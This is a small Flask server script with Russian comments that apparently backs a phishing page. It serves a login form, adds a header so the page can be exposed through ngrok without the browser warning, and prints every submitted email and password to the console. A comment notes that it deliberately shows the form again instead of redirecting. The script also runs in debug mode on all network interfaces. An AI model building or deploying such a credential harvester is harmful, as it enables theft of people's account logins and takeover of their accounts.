from flask import Flask, request, render_template

app = Flask(__name__)

@app.after_request
def add_ngrok_headers(response):
    response.headers['ngrok-skip-browser-warning'] = 'anyvalue'
    return response

@app.route('/')
def home():
    return render_template('login.html')


@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        print(f"\n=== Получены данные ===")
        print(f"Email: {email}")
        print(f"Password: {password}")
        print("=====================\n")

        # Не делаем редирект, а просто снова показываем форму
        return render_template('login.html')

    return render_template('login.html')


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
